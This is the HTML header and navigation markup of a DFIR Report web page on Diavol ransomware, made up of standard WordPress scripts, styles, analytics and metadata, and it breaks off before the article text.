<!doctype html>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<link rel="profile" href="https://gmpg.org/xfn/11">
<title>Diavol Ransomware &#8211; The DFIR Report</title>
<meta name="robots" content="max-image-preview:large" />
<link rel="dns-prefetch" href="//stats.wp.com" />
<link rel="dns-prefetch" href="//c0.wp.com" />
<link rel="alternate" type="application/rss+xml" title="The DFIR Report &raquo; Feed" href="https://thedfirreport.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="The DFIR Report &raquo; Comments Feed" href="https://thedfirreport.com/comments/feed/" />
<script type="a9cd24205746bd4ad0a209ac-text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/thedfirreport.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.6.2"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<link rel="stylesheet" id="jetpack_related-posts-css" href="https://c0.wp.com/p/jetpack/13.9.1/modules/related-posts/related-posts.css" type="text/css" media="all" />
<style id="wp-emoji-styles-inline-css" type="text/css">

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel="stylesheet" id="wp-block-library-css" href="https://c0.wp.com/c/6.6.2/wp-includes/css/dist/block-library/style.min.css" type="text/css" media="all" />
<link rel="stylesheet" id="mediaelement-css" href="https://c0.wp.com/c/6.6.2/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css" type="text/css" media="all" />
<link rel="stylesheet" id="wp-mediaelement-css" href="https://c0.wp.com/c/6.6.2/wp-includes/js/mediaelement/wp-mediaelement.min.css" type="text/css" media="all" />
<style id="jetpack-sharing-buttons-style-inline-css" type="text/css">
.jetpack-sharing-buttons__services-list{display:flex;flex-direction:row;flex-wrap:wrap;gap:0;list-style-type:none;margin:5px;padding:0}.jetpack-sharing-buttons__services-list.has-small-icon-size{font-size:12px}.jetpack-sharing-buttons__services-list.has-normal-icon-size{font-size:16px}.jetpack-sharing-buttons__services-list.has-large-icon-size{font-size:24px}.jetpack-sharing-buttons__services-list.has-huge-icon-size{font-size:36px}@media print{.jetpack-sharing-buttons__services-list{display:none!important}}.editor-styles-wrapper .wp-block-jetpack-sharing-buttons{gap:0;padding-inline-start:0}ul.jetpack-sharing-buttons__services-list.has-background{padding:1.25em 2.375em}
</style>
<style id="classic-theme-styles-inline-css" type="text/css">
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id="global-styles-inline-css" type="text/css">
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel="stylesheet" id="freenews-style-css" href="https://thedfirreport.com/wp-content/themes/freenews/style.css?ver=6.6.2" type="text/css" media="all" />
<style id="freenews-style-inline-css" type="text/css">
.tags-links, .byline, .comments-link { clip: rect(1px, 1px, 1px, 1px); height: 1px; position: absolute; overflow: hidden; width: 1px; }
</style>
<link rel="stylesheet" id="font-awesome-css" href="https://thedfirreport.com/wp-content/themes/freenews/assets/library/fontawesome/css/all.min.css?ver=6.6.2" type="text/css" media="all" />
<link rel="stylesheet" id="freenews-google-fonts-css" href="https://thedfirreport.com/wp-content/fonts/d92fef3d9e5de6f7993b11046e265436.css" type="text/css" media="all" />
<link rel="stylesheet" id="sharedaddy-css" href="https://c0.wp.com/p/jetpack/13.9.1/modules/sharedaddy/sharing.css" type="text/css" media="all" />
<link rel="stylesheet" id="social-logos-css" href="https://c0.wp.com/p/jetpack/13.9.1/_inc/social-logos/social-logos.min.css" type="text/css" media="all" />
<script type="a9cd24205746bd4ad0a209ac-text/javascript" id="jetpack_related-posts-js-extra">
/* <![CDATA[ */
var related_posts_js_options = {"post_heading":"h4"};
/* ]]> */
</script>
<script type="a9cd24205746bd4ad0a209ac-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/related-posts/related-posts.min.js" id="jetpack_related-posts-js"></script>
<script type="a9cd24205746bd4ad0a209ac-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/jquery/jquery.min.js" id="jquery-core-js"></script>
<script type="a9cd24205746bd4ad0a209ac-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/jquery/jquery-migrate.min.js" id="jquery-migrate-js"></script>
<script type="a9cd24205746bd4ad0a209ac-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/global.js?ver=1" id="freenews-global-js"></script>
<link rel="https://api.w.org/" href="https://thedfirreport.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://thedfirreport.com/wp-json/wp/v2/posts/4874" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://thedfirreport.com/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.6.2" />
<link rel="canonical" href="https://thedfirreport.com/2021/12/13/diavol-ransomware/" />
<link rel="shortlink" href="https://thedfirreport.com/?p=4874" />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2021%2F12%2F13%2Fdiavol-ransomware%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2021%2F12%2F13%2Fdiavol-ransomware%2F&#038;format=xml" />

<script async src="https://www.googletagmanager.com/gtag/js?id=UA-162747485-1" type="a9cd24205746bd4ad0a209ac-text/javascript"></script>
<script type="a9cd24205746bd4ad0a209ac-text/javascript">
			window.dataLayer = window.dataLayer || [];
			function gtag(){dataLayer.push(arguments);}
			gtag('js', new Date());
			gtag('config', 'UA-162747485-1');
		</script>
<script type="a9cd24205746bd4ad0a209ac-text/javascript">
(function(url){
	if(/(?:Chrome\/26\.0\.1410\.63 Safari\/537\.31|WordfenceTestMonBot)/.test(navigator.userAgent)){ return; }
	var addEvent = function(evt, handler) {
		if (window.addEventListener) {
			document.addEventListener(evt, handler, false);
		} else if (window.attachEvent) {
			document.attachEvent('on' + evt, handler);
		}
	};
	var removeEvent = function(evt, handler) {
		if (window.removeEventListener) {
			document.removeEventListener(evt, handler, false);
		} else if (window.detachEvent) {
			document.detachEvent('on' + evt, handler);
		}
	};
	var evts = 'contextmenu dblclick drag dragend dragenter dragleave dragover dragstart drop keydown keypress keyup mousedown mousemove mouseout mouseover mouseup mousewheel scroll'.split(' ');
	var logHuman = function() {
		if (window.wfLogHumanRan) { return; }
		window.wfLogHumanRan = true;
		var wfscr = document.createElement('script');
		wfscr.type = 'text/javascript';
		wfscr.async = true;
		wfscr.src = url + '&r=' + Math.random();
		(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(wfscr);
		for (var i = 0; i < evts.length; i++) {
			removeEvent(evts[i], logHuman);
		}
	};
	for (var i = 0; i < evts.length; i++) {
		addEvent(evts[i], logHuman);
	}
})('//thedfirreport.com/?wordfence_lh=1&hid=9F817F10BDB9A473A17F4D2FCED1E890');
</script> <style>img#wpstats{display:none}</style>
<style type="text/css" id="custom-background-css">
body.custom-background { background-color: #f8f8f8; }
</style>

<meta property="og:type" content="article" />
<meta property="og:title" content="Diavol Ransomware" />
<meta property="og:url" content="https://thedfirreport.com/2021/12/13/diavol-ransomware/" />
<meta property="og:description" content="In the past, threat actors have used BazarLoader to deploy Ryuk and Conti ransomware, as reported on many occasions. In this intrusion, however, a BazarLoader infection resulted in deployment of Di…" />
<meta property="article:published_time" content="2021-12-13T02:13:31+00:00" />
<meta property="article:modified_time" content="2021-12-13T12:40:18+00:00" />
<meta property="og:site_name" content="The DFIR Report" />
<meta property="og:image" content="https://thedfirreport.com/wp-content/uploads/2021/12/3.png" />
<meta property="og:image:width" content="1736" />
<meta property="og:image:height" content="867" />
<meta property="og:image:alt" content />
<meta property="og:locale" content="en_US" />
<meta name="twitter:text:title" content="Diavol Ransomware" />
<meta name="twitter:image" content="https://thedfirreport.com/wp-content/uploads/2021/12/3.png?w=640" />
<meta name="twitter:card" content="summary_large_image" />

<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-32x32.png" sizes="32x32" />
<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-180x180.png" />
<meta name="msapplication-TileImage" content="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-270x270.png" />
</head>
<body class="post-template-default single single-post postid-4874 single-format-standard custom-background has-sidebar tags-hidden author-hidden comment-hidden">
<div id="page" class="site">
<a class="skip-link screen-reader-text" href="#content">Skip to content</a>
<header id="masthead" class="site-header">
<div id="main-header" class="main-header">
<div class="navigation-top">
<div class="wrap">
<div id="site-header-menu" class="site-header-menu">
<nav class="main-navigation" aria-label="Primary Menu" role="navigation">
<button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
<span class="toggle-text">Menu</span>
<span class="toggle-bar"></span>
</button>
<ul id="primary-menu" class="menu nav-menu"><li id="menu-item-21337" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-21337"><a href="https://thedfirreport.com/">Reports</a></li>
<li id="menu-item-21314" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21314"><a href="https://thedfirreport.com/analysts/">Analysts</a></li>
<li id="menu-item-21315" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21315"><a href="https://thedfirreport.com/services/">Services</a>
<ul class="sub-menu">
<li id="menu-item-21319" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21319"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li id="menu-item-21318" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21318"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li id="menu-item-31055" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31055"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
<li id="menu-item-35456" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35456"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
<li id="menu-item-32606" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32606"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
<li id="menu-item-38108" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38108"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li id="menu-item-21320" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21320"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
<li id="menu-item-21317" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21317"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
<li id="menu-item-21325" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21325"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
<li id="menu-item-21326" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21326"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
</ul>
</li>
<li id="menu-item-31033" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-31033"><a href="https://store.thedfirreport.com/collections/dfir-labs">Access DFIR Labs</a></li>
<li id="menu-item-21312" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21312"><a href="https://thedfirreport.com/merchandise/">Merchandise</a></li>
<li id="menu-item-21313" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21313"><a href="https://thedfirreport.com/subscribe/">Subscribe</a></li>
<li id="menu-item-21316" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21316"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
</ul> </nav>
</div>
</div>
</div>
<nav class="secondary-navigation" role="navigation" aria-label="Secondary Navigation">
<div class="wrap">
<button class="secondary-menu-toggle" aria-controls="primary-menu" aria-expanded="false">
<span class="secondary-toggle-text">Menu</span>
<span class="secondary-toggle-bar"></span>
</button>
<ul id="primary-menu" class="secondary-menu"><li id="menu-item-21323" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21323"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li id="menu-item-21322" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21322"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li id="menu-item-31037" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31037"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
<li id="menu-item-35457" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35457"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
<li id="menu-item-32608" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32608"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
<li id="menu-item-38110" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38110"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li id="menu-item-21321" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21321"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
<li id="menu-item-21327" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21327"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
<li id="menu-item-21328" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21328"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
<li id="menu-item-21324" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21324"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
</ul> </div>
</nav>
<div class="main-header-brand">
<div class="header-brand">
<div class="wrap">
<div class="header-brand-content">
<div class="site-branding">
<div class="site-branding-text">
<p class="site-title"><a href="https://thedfirreport.com/" rel="home">The DFIR Report</a></p>
<p class="site-description">Real Intrusions by Real Attackers, The Truth Behind the Intrusion</p>
</div>
</div>
<div class="header-right">
<div class="header-banner">
</div>
</div>
</div>
</div>
</div>
<div id="nav-sticker">
<div class="navigation-top">
<div class="wrap">
<div id="site-header-menu" class="site-header-menu">
<nav id="site-navigation" class="main-navigation" aria-label="Primary Menu">
<button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
<span class="toggle-text">Menu</span>
<span class="toggle-bar"></span>
</button>
<ul id="primary-menu" class="menu nav-menu"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-21337"><a href="https://thedfirreport.com/">Reports</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21314"><a href="https://thedfirreport.com/analysts/">Analysts</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21315"><a href="https://thedfirreport.com/services/">Services</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21319"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21318"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31055"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35456"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32606"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38108"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21320"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21317"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21325"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21326"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
</ul>
</li>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-31033"><a href="https://store.thedfirreport.com/collections/dfir-labs">Access DFIR Labs</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21312"><a href="https://thedfirreport.com/merchandise/">Merchandise</a></li>
